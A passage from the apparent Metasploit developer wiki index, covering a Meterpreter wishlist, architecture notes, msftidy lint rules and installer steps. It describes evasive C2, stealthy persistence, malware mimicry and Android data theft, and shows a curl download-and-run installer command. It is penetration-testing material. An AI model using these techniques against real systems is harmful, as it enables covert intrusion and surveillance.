clear text credentials are captured. 2 extremely use cases would be on a terminal server, or a server that no one is logged into at the time of infection due to time zone or operating hour differences Websnapshot: Currently there isn\u2019t a way to weed out web applications once in a network. This feature would, using IE, or another method be able to generate a screenshot of what a page looks like in a browser (given a PROTOCOL/URL/PORT). Biggest requirement is auto-accepting any self signed SSL certs and showing when authentication is required. On-target resource cloning: Allowing a pentester to drop a binary and clone the ICON (in particular) of a binary would add to the stealthiness of an operation and add attack opportunities that weren\u2019t previously thought plausible Scatterbomb: Persistence is difficult, and making sure your session doesn\u2019t die because you chose the wrong process to migrate into or the user exited that process because the PDF looked hung. This would work by attempting OpenProcess on every process or a select list of processes and inject Meterpreter threads into them. But it would rely on the Mutex feature so that only one would be calling back at a time. Basically allowing for a resilient semi-persistent Meterpreter session that would save you from yourself when you accidentally type exit on the Meterpreter> prompt instead of your other terminal Mutex checking binary exports: This follows up with the scatterbomb but essentially when installing persistence as a pentester I only install one because installing more than one would raise the noise level of a compromised host. If the binary/callback would check a mutex before doing anything and looping based on a timeout that even better. OLE / Office Controls: This is basically an open ended feature request asking for support of for Office, mostly Outlook (like read newest emails, search email, etc). Configurable character set conversation for Shell sessions and channels. When spawning a windows shell from meterpreter, on a host that uses a German version of windows, all the special characters (e.g. \u00f6\u00e4\u00fc) are broken, i.e. they are either not rendered at all, or replaced with that default \"character not found\" unicode character. Forcing the terminal emulator to use cp850 made it work for now.","title":"Meterpreter Features"},{"location":"dev/dark/Meterpreter-Wishlist/#metepreter-stager-support","text":"[ DONE ] Network error tolerant versions of existing stagers [ DONE ] Tagged stagers that send the payload type, arch, platform during the staging process to enable shared listeners [ DONE ] Stagers that contain an embedded unique ID that can be used to identify which payload triggered what session [ DONE ] Stagers that are \"stageless\" for Meterpreter (include the entire main Meterpreter payload, plus any required extensions). In situations of high network latency or extreme network detection a non-staged exe is the only way to go. Ulta-met is a project that does this but isn\u2019t as stable or easy to work with as if it were just built into the binary creation options. [ DONE ] Stagers that are \"stageless\" for Meterpreter and include all potential functionality (all extensions)","title":"Metepreter Stager Support"},{"location":"dev/dark/Meterpreter-Wishlist/#meterpreter-transport-flexibility","text":"[ DONE ] Support for changing the transport (host, port, URL) of a live session to a new endpoint or protocol [ DONE ] Support for multiple transports for the initial session, using the first transport that works [ DONE ] Support for multiple endpoints across multiple transports for the initial session [ DONE ] Support for automatic switching between multiple transports while the session is running [ DONE ] Support for user-configured callback frequency and endpoint rotation Support for Tor tunneling to .onion and internet-facing listeners Support for time-based callback, such as limiting callbacks to certain times of the day. Support for P2P style callbacks. Gossip protocol to find other Meterpreters on the network and use them as exfiltration point. This callback would reduce the amount of endpoints that would call \u201cout\u201d to a handler to 1. Whoever the \u201cmaster\u201d was. All comms would automatically (because, math) find and delegate this master and finally send through the master all of their comms. This could happen over a named pipe, or a forwarded port or something. (DHT?) Support for DNS A/TXT transports Support for UDP transports Support for ICMP transports Support for TLS encrypted bind listeners Support for HTTP application listener (ie CGI mode Meterpreter session, tomcat servlets, etc) Support for third-party communication transports (Github, Twitter, pastebin, etc) Support for XMPP transports. Many organizations use IM and chat clients internally and support them going outbound. reverse_tcp being stopped for the most part these days and more and more catching reverse_http(s) due to proxies, this might become the next outlet. Possibly using server that are already established in the industry ;-) but mainly supporting XYZ jabber server as a pass through. This would probably be a very big piece of shellcode as I don\u2019t believe any Windows OSs support XMPP out of the box. Support for IE callback: One method deployed by some more infamous malware is to only communicate when IE is running and surfing and only by hooking IE to send comms. This callback would operate very much the same and would support any kind of proxy by default as IE does. Support for Outlook callback: This callback would use email back and forth either directly to a MSF run SMTP server or through other services, but the C2 channel would be locally (not on the exchange filter system) auto-filtered to a non-visible folder (using PidTagAttributeHidden). This type of comms would greatly increase the lag time supported in Metepreter simply due to the inherent lag in email.","title":"Meterpreter Transport Flexibility"},{"location":"dev/dark/Meterpreter-Wishlist/#meterpreter-http-transport-options","text":"[ DONE ] Create a whitelist of allowed URLs on the handler, have these persistent between metasploit runs [ DONE ] Indicate whether a given handler should silently accept, accept and report, or drop connections using unregistered URLs [ DONE ] Whitelisted URLs should be referencing using an alias, stored persistently with the URL [ DONE ] Session listing output should indicate what URL and URL alias a particular session is associated with [ DONE ] URLs can be anywhere from 30 to 128 bytes long","title":"Meterpreter HTTP Transport Options"},{"location":"dev/dark/Meterpreter-Wishlist/#meterpreter-proxy-support","text":"[ DONE ] Use Windows Credentials with NTLM Authentication to connect via System Proxy back to attacker If Meterpreter executes as system - option to find a user, and use that users proxy settings for comms (temporarily or cleanup on exit) - maybe something like RunAsCurrentUser [ DONE ] Better proxy support and the ability to sleep. Still more to done on burstable updates","title":"Meterpreter Proxy Support"},{"location":"dev/dark/Meterpreter-Wishlist/#communication-protection","text":"Authenticated callbacks: This is pretty straight forward, when a pentester no longer controls the IP they were attacking from and failed to clean up every binary and phishing email there is a chance of compromise by proxy. The problem was somewhat solved with SessionExpirationTimeout and SessionCommunicationTimeout but both of them are loaded in the stage, not hard coded into any binary built, so it\u2019s very easy to get into this situation. Authenticated callbacks would allow a pentester to add a small layer of protections if this event were to happen and a callback from a client was sent to an IP no longer in the pentester\u2019s control Embedded TLS cert or hash of cert to verify Meterpreter instance on the Metasploit side [ DONE ] Embedded TLS cert or hash of cert to verify Metasploit instance on the Meterpreter side Embedded password to verify Meterpreter instance on the Metasploit side (challenge-response) Embedded password to verify Metasploit instance on the Meterpreter side (challenge-response) [ DONE ] Enable TLS verification to verify Metasploit instance on the Meterpreter side [ DONE ] Allow open, relaxed, strict modes of payload authentication (everything, everything but flag unauthorized, drop non-authorized)","title":"Communication Protection"},{"location":"dev/dark/Meterpreter-Wishlist/#communications-evasion","text":"Emulation of common web application traffic when using HTTP-based transports Change web application traffic emulation fingerprints on the fly when using HTTP-based transports [ DONE ] Sleeping for a specified period of time before reconnecting to Metasploit [ DONE ] Automatic shutdown/cleanup after a specified amount of time has passed Traffic shaping or malleable communications, especially for HTTP(S), can be very useful for blending in, or even for adversary simulation. See Maligno (OSS - http://www.encripto.no/tools/ ) Malleable network signatures in general Malleable file artefacts - Make Meterpreter look like PlugX / Poison Ivy / etc. Stealthier network comms (C2 DLL inject into web browser) Better support to automatically identify applications that use a corporate proxy that allows outside connections and then leverage this application's features Emulate various real world malware Being able to use Meterpreter instances to easily forward commands & exfil Supporting a set URI path for reverse_http(s), so you can use other webservers as a reverse proxy.","title":"Communications Evasion"},{"location":"dev/dark/Meterpreter-Wishlist/#session-handlers","text":"[ DONE ] Generate a unique ID for each session (target-side) [ DONE ] Generate a unique ID for each generated payload Backdooring/Persisting on more than 10 machines over months it gets very difficult to know when a host hasn\u2019t called back in a while or when a new host arrives. This would need not to be based on gateway, local IP, or any other transient information. This can be processed at any step as long as when STDAPI is loaded I can quickly identify if it\u2019s a system that I\u2019ve known about, and how long it\u2019s been since I\u2019ve seen it. Shared listeners that can stage multiple payload architectures and platforms (using tags). Depends on new stagers and a new listener and unique IDs. [ IN PROGRESS ] [ DONE ] Track the last time a given session checked in Track user defined state data in the db, such as specific user / member of group logged in, specific shares open, certain tuple of IP:port in network connections (1.2.3.4 over 22 where 1.2.3.4 is an IP of interest) Reconnecting payloads will have different IPs, take this into account for session methods (peerinfo/tunnelinfo, etc)","title":"Session Handlers"},{"location":"dev/dark/Meterpreter-Wishlist/#session-reliability","text":"[ DONE ] Metasploit payloads should always restore connections if there is a network error unless the user explicitly kills the session Improve reliability, encryption, authentication. Better integration for custom payloads. Spawn a new session before running a module that could crash the current session (mostly privilege escalation, but some buggy post modules too [railgun]) Meterpreter should work robustly in a VM, on a cloud server, or through corp proxies","title":"Session Reliability"},{"location":"dev/dark/Meterpreter-Wishlist/#android-meterpreter-features","text":"Android gather modules for auth tokens & sqlite databases (call logs, contacts, email, etc) [ DONE ] Android lock screen removal Crack the lock screen hash to reveal the password, pin code or gesture Remote screen control Add record_mic_stream (trigger based on event, like phone call) [ DONE ] Grab photos from front and rear cameras Android desktop background, sound play, vibrate, screenshot [ DONE ] Quickly grab GPS coordinates Windows post module to install Meterpreter on any attached android devices Better pivoting (e.g bridging between WiFi and 4g) More root exploits Dump browsing history and cookies Comprehensive test suite (including rspec) ARM/POSIX Meterpreter [ DONE ] Support for native payloads in the addJavascriptInterface exploit","title":"Android Meterpreter Features"},{"location":"dev/dark/Meterpreter-Wishlist/#payload-generation","text":"Msfvenom should support injecting into existing APKs for Android Meterpreter deployment. Otherwise, it's just an app the target installs for 10 seconds and removes after confirming it has no user interface, barely allowing the Meterpreter session to be created. [ IN PROGRESS ] Msfvenom really needs to spit out some C# payloads. You can pretty easily modify some of the powershell ones to be C#, but there really ought to be a built in C# payload. [ DONE ] Generated payloads should default to exiting the process when the shellcode completes [ DONE ] Payload generation should allow named UUIDs to be injected into payloads","title":"Payload Generation"},{"location":"dev/dark/Meterpreter-Wishlist/#unit-testing-for-payloads","text":"Metasploit payload classes should have specs, new specs should be created when any class is changed if there isn\u2019t an existing spec. Metasploit payload tests that can run in Travis, should be automatically tested end-to-end Metasploit payload tests that can\u2019t run in Travis should be run by Jenkins and target a virtual machine (local or cloud-hosted). Meterpreter payloads should test every advertised console command. Meterpreter payloads should test a subset of the full APIs available.","title":"Unit testing for payloads"},{"location":"dev/dark/Meterpreter-Wishlist/#meterpreter-specifications","text":"These define compatibility, quality, and order of preference for Meterpreter payload modules, including stages and stages. Payload Flags (for matching with exploits/generators/handlers): Supports SSL Supports ZLIB Staged / Unstaged Quality Rank (for prioritizing bugs/feature work): Leverage using Rank system Windows: Excellent Python: Great Java: Good PHP: Normal POSIX: Normal Capabilities (queried post-stage to determine features): Filesystem Registry Pivoting (sockets) Pivoting vpn) Process listing, kill, execute Process memory read, write, injection Migration","title":"Meterpreter Specifications"},{"location":"dev/dark/Meterpreter/","text":"Meterpreter is an advanced payload that has been part of Metasploit since 2004. Originally written in C by Matt \"skape\" Miller, dozens of contributors have provided additional code, including implementations in PHP, Python, and Java. The payload continues to be frequently updated as part of Metasploit development. Meterpreter development occurs in the metasploit-payloads repository and the compiled results are published as part of the metasploit-payloads gem . For a detailed understanding of the Meterpreter architecture, please review the original specification . Additional documentation about Meterpreter can be found on this wiki: * [[Meterpreter Reliable Network Communication]] * [[Meterpreter Transport Control]] * [[Meterpreter HTTP Communication]] * [[Meterpreter Timeout Control]] * [[Meterpreter Sleep Control]] * [[Meterpreter Stageless Mode]] * [[Meterpreter Unicode Support]] * [[Meterpreter Configuration]] * [[Payload UUID]] Extension-specific documentation: * [[Python Extension]] * [[Powershell Extension]] A wishlist of features is maintained at the [[Meterpreter Wishlist]] page. Examples of specific use cases can also be found on this wiki: * [[Meterpreter Paranoid Mode]] Those interested in the technical details of Meterpeter, along with rationale behind some of the implementations, should read the following: * [[The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers]] Got dead Meterpreter sessions? Read this: [[Debugging Dead Meterpreter Sessions]]. Architecture To avoid confusion, the victim running meterpreter is always called the server and the ruby side controlling it is always called the client, regardless of the direction of the network transport connection. The Meterpreter server is broken into several pieces: - metsrv.dll and meterpreter.{jar,php,py} - this is the heart of meterpreter where the protocol and extension systems are implemented. - ext_server_stdapi.{dll,jar,php,py} - this extension implements most of the commands familiar to users. - ext_server_*.{dll,jar,php,py} - other extensions provide further functionality and can be specific to particular environments. Delivering Meterpreter Using a technique developed by Stephen Fewer called Reflective DLL Injection (RDI), metsrv.dll's header is modified to be usable as shellcode. From there, Metasploit can embed it in an executable or run it via an exploit like any other shellcode.","title":"Meterpreter"},{"location":"dev/dark/Meterpreter/#architecture","text":"To avoid confusion, the victim running meterpreter is always called the server and the ruby side controlling it is always called the client, regardless of the direction of the network transport connection. The Meterpreter server is broken into several pieces: - metsrv.dll and meterpreter.{jar,php,py} - this is the heart of meterpreter where the protocol and extension systems are implemented. - ext_server_stdapi.{dll,jar,php,py} - this extension implements most of the commands familiar to users. - ext_server_*.{dll,jar,php,py} - other extensions provide further functionality and can be specific to particular environments.","title":"Architecture"},{"location":"dev/dark/Meterpreter/#delivering-meterpreter","text":"Using a technique developed by Stephen Fewer called Reflective DLL Injection (RDI), metsrv.dll's header is modified to be usable as shellcode. From there, Metasploit can embed it in an executable or run it via an exploit like any other shellcode.","title":"Delivering Meterpreter"},{"location":"dev/dark/Msftidy/","text":"Description Checks File modes This check ensures that modules are not marked executable. A module is only called by the framework and not directly. The correct file mode is ?? Shebang A module should not have a Shebang line. Nokogiri Modules should not rely on the Nokogiri GEM. Please use REXML instead. Invalid Formats CVE CVE references should be in the format YYYY-NNNN BID BID references should only contain numbers MSB OSVDB references should be in the format MSddd-ddd (d = digit) MIL Milw0rm references are no longer supported (site suspended) EDB EDB references should only contain numbers US-CERT-VU US-CERT references should only contain numbers ZDI ZDI references should be in the format dd-ddd (d = digit) URL If you supply an URL where a short identifiert is available, please use the identifier. Old Keywords Before Metasploit moved to Github the sources were stored in a SVN repository. SVN has support to replace custom variables with current values like the last revision. Since GIT does not support them, the references should be removed from code. Verbose You should not define a VERBOSE option in your module. A VERBOSE option is already provided by the framework. To make use of the VERBOSE setting, you can use methods like vprint_status and vprint_error Badchars This checks looks for bad characters in the module title. If you encounter this error, please replace the characters. File Extension All modules should have a .rb file extenstion to be loaded by the framework. Old Rubies This check checks the file for syntax errors with old Ruby versions. By default this check will not run. To execute this check you need to set the environment variable MSF_CHECK_OLD_RUBIES . Ranking This check ensures you added the correct ranking to your module. Click here to read more about Exploit Ranking. Disclosure Date Date format needs to be Month Day, YYYY . Example: Jan 01, 2014 Title Casing This check ensures you used the correct case in your title. Bad Terms This checks for the correct use of the terms Stack Buffer overflow and Stack Exhaustion . See \"Stack overflow\" vs \"Stack buffer overflow\" for more information. Function Arguments If you define a function which defines a lot of input arguments, the check ensures you use a hash instead. Line Check Unicode Your module must not contain Unicode characters. Spaces at EOL Your module must not conatin spaces at the end of a line. Mixed Tab Spaces Your module contains Tabs and Spaces in one line. Only spaces should be used Tabs Your module should not use tabs for intending code. Please use spaces instead. Carriage return The specified line only contains a carriage return ( \\r ) at the end of line. Please change to a normal linebreak ( \\n or \\r\\n ). File.open You used a File.open call without specifying a binary mode??? Load You used the load command in your module. This is not required since the framework loads all necessary files for you. STDOUT Modules should not write directly to stdout. Please use the print_* functions instead. Modified datastore Datastore options (options set by the user) should not be modified in code. If you need to change some values use local variables instead. Set-Cookie The Set-Cookie header should not be parsed by your code. You can use the API call res.get_cookies insteady which already handles some special cases and ensures a clean header. Auxiliary Rand Auxiliary modules should have no Rank. Only Exploits and Payloads should have a Rank attribute. Snake Case This check ensures your module filename is in Snake Case Old License This check checks for the old Metasploit license in the module header. You can use the tool ruby tools/dev/resplat.rb <filename> to convert the file. VULN Codes This check ensures only known CheckCodes are returned by the check function. vars_get When using send_request_cgi or send_request_raw the URL supplied should not contain GET Paramters. Please provide the Parameter via the vars_get hash. Example: bad: res = send_request_raw ({ 'uri' => uri_base + '/upload.php?type=file&folder=' + folder }) good: res = send_request_raw ({ 'uri' => uri_base + '/upload.php' , 'vars_get' => { 'type' => 'file' , 'folder' => folder } })","title":"Description"},{"location":"dev/dark/Msftidy/#description","text":"","title":"Description"},{"location":"dev/dark/Msftidy/#checks","text":"","title":"Checks"},{"location":"dev/dark/Msftidy/#file-modes","text":"This check ensures that modules are not marked executable. A module is only called by the framework and not directly. The correct file mode is ??","title":"File modes"},{"location":"dev/dark/Msftidy/#shebang","text":"A module should not have a Shebang line.","title":"Shebang"},{"location":"dev/dark/Msftidy/#nokogiri","text":"Modules should not rely on the Nokogiri GEM. Please use REXML instead.","title":"Nokogiri"},{"location":"dev/dark/Msftidy/#invalid-formats","text":"","title":"Invalid Formats"},{"location":"dev/dark/Msftidy/#cve","text":"CVE references should be in the format YYYY-NNNN","title":"CVE"},{"location":"dev/dark/Msftidy/#bid","text":"BID references should only contain numbers","title":"BID"},{"location":"dev/dark/Msftidy/#msb","text":"OSVDB references should be in the format MSddd-ddd (d = digit)","title":"MSB"},{"location":"dev/dark/Msftidy/#mil","text":"Milw0rm references are no longer supported (site suspended)","title":"MIL"},{"location":"dev/dark/Msftidy/#edb","text":"EDB references should only contain numbers","title":"EDB"},{"location":"dev/dark/Msftidy/#us-cert-vu","text":"US-CERT references should only contain numbers","title":"US-CERT-VU"},{"location":"dev/dark/Msftidy/#zdi","text":"ZDI references should be in the format dd-ddd (d = digit)","title":"ZDI"},{"location":"dev/dark/Msftidy/#url","text":"If you supply an URL where a short identifiert is available, please use the identifier.","title":"URL"},{"location":"dev/dark/Msftidy/#old-keywords","text":"Before Metasploit moved to Github the sources were stored in a SVN repository. SVN has support to replace custom variables with current values like the last revision. Since GIT does not support them, the references should be removed from code.","title":"Old Keywords"},{"location":"dev/dark/Msftidy/#verbose","text":"You should not define a VERBOSE option in your module. A VERBOSE option is already provided by the framework. To make use of the VERBOSE setting, you can use methods like vprint_status and vprint_error","title":"Verbose"},{"location":"dev/dark/Msftidy/#badchars","text":"This checks looks for bad characters in the module title. If you encounter this error, please replace the characters.","title":"Badchars"},{"location":"dev/dark/Msftidy/#file-extension","text":"All modules should have a .rb file extenstion to be loaded by the framework.","title":"File Extension"},{"location":"dev/dark/Msftidy/#old-rubies","text":"This check checks the file for syntax errors with old Ruby versions. By default this check will not run. To execute this check you need to set the environment variable MSF_CHECK_OLD_RUBIES .","title":"Old Rubies"},{"location":"dev/dark/Msftidy/#ranking","text":"This check ensures you added the correct ranking to your module. Click here to read more about Exploit Ranking.","title":"Ranking"},{"location":"dev/dark/Msftidy/#disclosure-date","text":"Date format needs to be Month Day, YYYY . Example: Jan 01, 2014","title":"Disclosure Date"},{"location":"dev/dark/Msftidy/#title-casing","text":"This check ensures you used the correct case in your title.","title":"Title Casing"},{"location":"dev/dark/Msftidy/#bad-terms","text":"This checks for the correct use of the terms Stack Buffer overflow and Stack Exhaustion . See \"Stack overflow\" vs \"Stack buffer overflow\" for more information.","title":"Bad Terms"},{"location":"dev/dark/Msftidy/#function-arguments","text":"If you define a function which defines a lot of input arguments, the check ensures you use a hash instead.","title":"Function Arguments"},{"location":"dev/dark/Msftidy/#line-check","text":"","title":"Line Check"},{"location":"dev/dark/Msftidy/#unicode","text":"Your module must not contain Unicode characters.","title":"Unicode"},{"location":"dev/dark/Msftidy/#spaces-at-eol","text":"Your module must not conatin spaces at the end of a line.","title":"Spaces at EOL"},{"location":"dev/dark/Msftidy/#mixed-tab-spaces","text":"Your module contains Tabs and Spaces in one line. Only spaces should be used","title":"Mixed Tab Spaces"},{"location":"dev/dark/Msftidy/#tabs","text":"Your module should not use tabs for intending code. Please use spaces instead.","title":"Tabs"},{"location":"dev/dark/Msftidy/#carriage-return","text":"The specified line only contains a carriage return ( \\r ) at the end of line. Please change to a normal linebreak ( \\n or \\r\\n ).","title":"Carriage return"},{"location":"dev/dark/Msftidy/#fileopen","text":"You used a File.open call without specifying a binary mode???","title":"File.open"},{"location":"dev/dark/Msftidy/#load","text":"You used the load command in your module. This is not required since the framework loads all necessary files for you.","title":"Load"},{"location":"dev/dark/Msftidy/#stdout","text":"Modules should not write directly to stdout. Please use the print_* functions instead.","title":"STDOUT"},{"location":"dev/dark/Msftidy/#modified-datastore","text":"Datastore options (options set by the user) should not be modified in code. If you need to change some values use local variables instead.","title":"Modified datastore"},{"location":"dev/dark/Msftidy/#set-cookie","text":"The Set-Cookie header should not be parsed by your code. You can use the API call res.get_cookies insteady which already handles some special cases and ensures a clean header.","title":"Set-Cookie"},{"location":"dev/dark/Msftidy/#auxiliary-rand","text":"Auxiliary modules should have no Rank. Only Exploits and Payloads should have a Rank attribute.","title":"Auxiliary Rand"},{"location":"dev/dark/Msftidy/#snake-case","text":"This check ensures your module filename is in Snake Case","title":"Snake Case"},{"location":"dev/dark/Msftidy/#old-license","text":"This check checks for the old Metasploit license in the module header. You can use the tool ruby tools/dev/resplat.rb <filename> to convert the file.","title":"Old License"},{"location":"dev/dark/Msftidy/#vuln-codes","text":"This check ensures only known CheckCodes are returned by the check function.","title":"VULN Codes"},{"location":"dev/dark/Msftidy/#vars_get","text":"When using send_request_cgi or send_request_raw the URL supplied should not contain GET Paramters. Please provide the Parameter via the vars_get hash. Example: bad: res = send_request_raw ({ 'uri' => uri_base + '/upload.php?type=file&folder=' + folder }) good: res = send_request_raw ({ 'uri' => uri_base + '/upload.php' , 'vars_get' => { 'type' => 'file' , 'folder' => folder } })","title":"vars_get"},{"location":"dev/dark/Nightly-Installers/","text":"Installers are built nightly for OS X, Windows (64-bit) and Linux. These installers include dependencies (like Ruby and PostgreSQL) and integrate with your package manager, so they're easy to update. What operating system are you using? Linux / Mac OS X ## Installing Metasploit on Linux / Mac OS X The following script invocation will import the Rapid7 signing key and setup the package for supported Linux and OS X systems: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \\ chmod 755 msfinstall && \\ ./msfinstall These packages integrate into your package manager and can be updated with ```msfupdate``` or with your package manager. On first start, these packages will automatically setup the database or use your existing database. Expand a full log of the installation process on an Ubuntu-based Chromebook bcook@localhost:~$ uname -a Linux localhost 3.14.0 #1 SMP PREEMPT Mon Feb 6 21:59:30 PST 2017 armv7l armv7l armv7l GNU/Linux bcook@localhost:~$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \\ > chmod 755 msfinstall && \\ > ./msfinstall % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 5394 100 5394 0 0 5609 0 --:--:-- --:--:-- --:--:-- 5607 Switching to root user to update the package [sudo] password for bcook: Adding metasploit-framework to your repository list..OK Updating package cache..OK Checking for and installing update.. Reading package lists... Done Building dependency tree Reading state information... Done The following NEW packages will be installed: metasploit-framework 0 upgraded, 1 newly installed, 0 to remove and 2 not upgraded. Need to get 148 MB of archives. After this operation, 358 MB of additional disk space will be used. Get:1 http://downloads.metasploit.com/data/releases/metasploit-framework/apt lucid/main armhf metasploit-framework armhf 4.13.23+20170217143300.git.1.85dca6a~1rapid7-1 [148 MB] Fetched 148 MB in 19s (7743 kB/s) Selecting previously unselected package metasploit-framework. (Reading database ... 28449 files and directories currently installed.) Preparing to unpack .../metasploit-framework_4.13.23+20170217143300.git.1.85dca6a~1rapid7-1_armhf.deb ... Unpacking metasploit-framework (4.13.23+20170217143300.git.1.85dca6a~1rapid7-1) ... Setting up metasploit-framework (4.13.23+20170217143300.git.1.85dca6a~1rapid7-1) ... update-alternatives: using /opt/metasploit-framework/bin/msfbinscan to provide /usr/bin/msfbinscan (msfbinscan) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfconsole to provide /usr/bin/msfconsole (msfconsole) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfd to provide /usr/bin/msfd (msfd) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfdb to provide /usr/bin/msfdb (msfdb) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfelfscan to provide /usr/bin/msfelfscan (msfelfscan) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfmachscan to provide /usr/bin/msfmachscan (msfmachscan) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfpescan to provide /usr/bin/msfpescan (msfpescan) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfrop to provide /usr/bin/msfrop (msfrop) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfrpc to provide /usr/bin/msfrpc (msfrpc) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfrpcd to provide /usr/bin/msfrpcd (msfrpcd) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfupdate to provide /usr/bin/msfupdate (msfupdate) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfvenom to provide /usr/bin/msfvenom (msfvenom) in auto mode Run msfconsole to get started W: --force-yes is deprecated, use one of the options starting with --allow instead. bcook@localhost:~$ msfconsole ** Welcome to Metasploit Framework Initial Setup ** Please answer a few questions to get started. Would you like to use and setup a new database (recommended)? y Creating database at /home/bcook/.msf4/db Starting database at /home/bcook/.msf4/db...success Creating database users Creating initial database schema ** Metasploit Framework Initial Setup Complete ** =[ metasploit v4.13.23-dev-584850f1f8a1a74b69b5cea16c700c9fd1b8e4c6] + -- --=[ 1622 exploits - 924 auxiliary - 282 post ] + -- --=[ 472 payloads - 39 encoders - 9 nops ] + -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ] msf > Expand manual installation instructions ### Linux manual installation Linux packages are built nightly for .deb (i386, amd64, armhf, arm64) and .rpm (64-bit x86) systems. Debian/Ubuntu packages are available at https://apt.metasploit.com and CentOS/Redhat/Fedora packages are located at https://rpm.metasploit.com. ### OS X manual installation The latest OS X installer package can also be downloaded directly here: https://osx.metasploit.com/metasploitframework-latest.pkg, with the last 10 builds archived at https://osx.metasploit.com/. Simply download and launch the installer to install Metaploit Framework with all of its dependencies. Once installed, initially launch msfconsole as ```/opt/metasploit-framework/bin/msfconsole``` from a terminal console. A series of prompts will help you setup a database and add Metasploit to your local PATH. You can also follow the quick-installation instructions above to install in a single step. Windows ## Installing Metasploit on Windows Download the [latest Windows installer](https://windows.metasploit.com/metasploitframework-latest.msi) or [view older builds](https://windows.metasploit.com/). To install, simply download the .msi package, adjust your Antivirus as-needed to ignore c:\\metasploit-framework, double-click and enjoy. The msfconsole command and all related tools will be added to the system %PATH% environment variable. ### Windows Anti-virus software flags the contents of these packages! If you downloaded Metasploit from us, there is no cause for alarm. We pride ourselves on offering the ability for our customers and followers to have the same toolset that the hackers have so that they can test systems more accurately. Because these (and the other exploits and tools in Metasploit) are identical or very similar to existing malicious toolsets, they can be used for nefarious purposes, and they are often flagged and automatically removed by antivirus programs, just like the malware they mimic. ## Improving these installers Feel free to review and help improve [the source code for our installers](https://github.com/rapid7/metasploit-omnibus).","title":"Nightly Installers"},{"location":"dev/dark/Nightly-Installers/#what-operating-system-are-you-using","text":"Linux / Mac OS X ## Installing Metasploit on Linux / Mac OS X The following script invocation will import the Rapid7 signing key and setup the package for supported Linux and OS X systems: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \\ chmod 755 msfinstall && \\ ./msfinstall These packages integrate into your package manager and can be updated with ```msfupdate``` or with your package manager. On first start, these packages will automatically setup the database or use your existing database. Expand a full log of the installation process on an Ubuntu-based Chromebook bcook@localhost:~$ uname -a Linux localhost 3.14.0 #1 SMP PREEMPT Mon Feb 6 21:59:30 PST 2017 armv7l armv7l armv7l GNU/Linux bcook@localhost:~$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \\ > chmod 755 msfinstall && \\ > ./msfinstall % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 5394 100 5394 0 0 5609 0 --:--:-- --:--:-- --:--:-- 5607 Switching to root user to update the package [sudo] password for bcook: Adding metasploit-framework to your repository list..OK Updating package cache..OK Checking for and installing update.. Reading package lists... Done Building dependency tree Reading state information... Done The following NEW packages will be installed: metasploit-framework 0 upgraded, 1 newly installed, 0 to remove and 2 not upgraded. Need to get 148 MB of archives. After this operation, 358 MB of additional disk space will be used. Get:1 http://downloads.metasploit.com/data/releases/metasploit-framework/apt lucid/main armhf metasploit-framework armhf 4.13.23+20170217143300.git.1.85dca6a~1rapid7-1 [148 MB] Fetched 148 MB in 19s (7743 kB/s) Selecting previously unselected package metasploit-framework. (Reading database ... 28449 files and directories currently installed.) Preparing to unpack .../metasploit-framework_4.13.23+20170217143300.git.1.85dca6a~1rapid7-1_armhf.deb ... Unpacking metasploit-framework (4.13.23+20170217143300.git.1.85dca6a~1rapid7-1) ... Setting up metasploit-framework (4.13.23+20170217143300.git.1.85dca6a~1rapid7-1) ... update-alternatives: using /opt/metasploit-framework/bin/msfbinscan to provide /usr/bin/msfbinscan (msfbinscan) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfconsole to provide /usr/bin/msfconsole (msfconsole) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfd to provide /usr/bin/msfd (msfd) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfdb to provide /usr/bin/msfdb (msfdb) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfelfscan to provide /usr/bin/msfelfscan (msfelfscan) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfmachscan to provide /usr/bin/msfmachscan (msfmachscan) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfpescan to provide /usr/bin/msfpescan (msfpescan) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfrop to provide /usr/bin/msfrop (msfrop) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfrpc to provide /usr/bin/msfrpc (msfrpc) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfrpcd to provide /usr/bin/msfrpcd (msfrpcd) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfupdate to provide /usr/bin/msfupdate (msfupdate) in auto mode update-alternatives: using /opt/metasploit-framework/bin/msfvenom to provide /usr/bin/msfvenom (msfvenom) in auto mode Run msfconsole to get started W: --force-yes is deprecated, use one of the options starting with --allow instead. bcook@localhost:~$ msfconsole ** Welcome to Metasploit Framework Initial Setup ** Please answer a few questions to get started. Would you like to use and setup a new database (recommended)? y Creating database at /home/bcook/.msf4/db Starting database at /home/bcook/.msf4/db...success Creating database users Creating initial database schema ** Metasploit Framework Initial Setup Complete ** =[ metasploit v4.13.23-dev-584850f1f8a1a74b69b5cea16c700c9fd1b8e4c6] + -- --=[ 1622 exploits - 924 auxiliary - 282 post ] + -- --=[ 472 payloads - 39 encoders - 9 nops ] + -- --=[ Free Metasploit Pro trial: 